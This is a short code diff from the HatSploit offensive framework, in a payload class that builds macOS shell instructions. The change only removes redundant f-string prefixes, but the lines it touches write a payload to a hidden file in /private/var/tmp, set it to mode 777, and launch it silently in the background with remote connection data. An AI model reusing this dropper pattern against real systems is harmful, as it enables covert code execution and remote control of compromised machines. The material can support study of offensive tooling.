@@ -78,8 +78,8 @@ class HatSploitPayload(HatSploitPayload):
             self.badges.output_error("Failed to generate payload!")
 
         instructions = ""
-        instructions += f"cat >/private/var/tmp/.payload;"
-        instructions += f"chmod 777 /private/var/tmp/.payload;"
+        instructions += "cat >/private/var/tmp/.payload;"
+        instructions += "chmod 777 /private/var/tmp/.payload;"
         instructions += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
         instructions += "\n"
 
